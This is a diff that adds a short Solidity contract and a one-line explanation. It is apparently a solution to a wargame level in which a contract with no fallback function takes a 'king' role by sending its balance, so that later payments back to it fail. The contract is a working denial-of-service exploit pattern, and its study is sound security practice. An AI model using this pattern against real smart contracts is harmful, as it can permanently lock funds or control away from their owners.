@@ -1,0 +1,12 @@
+Using a contract to make the call with a constructor that takes the instance address during deployment
+Because there is no fallback function, the contract fails.
+
+pragma solidity ^0.4.18;
+
+contract CrownMeForever {
+    
+    constructor(address _instance) payable public {
+        _instance.call.gas(100000000).value(address(this).balance)();
+        
+    }
+}
